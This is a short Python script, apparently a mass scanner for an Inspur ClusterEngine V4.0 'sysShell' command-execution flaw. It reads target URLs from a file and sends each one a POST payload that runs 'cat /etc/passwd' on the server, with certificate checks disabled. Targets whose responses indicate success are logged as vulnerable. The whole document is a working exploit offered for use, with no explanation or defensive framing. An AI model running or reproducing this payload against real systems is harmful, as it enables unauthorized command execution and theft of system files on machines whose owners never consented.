import requests
import time

data = "op=doPlease&node=cu01&command=cat /etc/passwd"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
}

for url in open("浪潮ClusterEngine.txt"):
    try:
        url = url.replace("\n", "")
        print(url+"检测中----\n\n")
        jiaoyan = requests.post(url+"sysShell", headers=headers, data=data, verify=False, timeout=5)
        if (("info" in jiaoyan.text) and (jiaoyan.status_code != 404)) or (("Name or service not" in jiaoyan.text) and (jiaoyan.status_code != 404)):
            with open("浪潮ClusterEngineV4.0 sysShell vul.txt", "a+") as f:
                f.write(url+"\n")
    except:
        continue

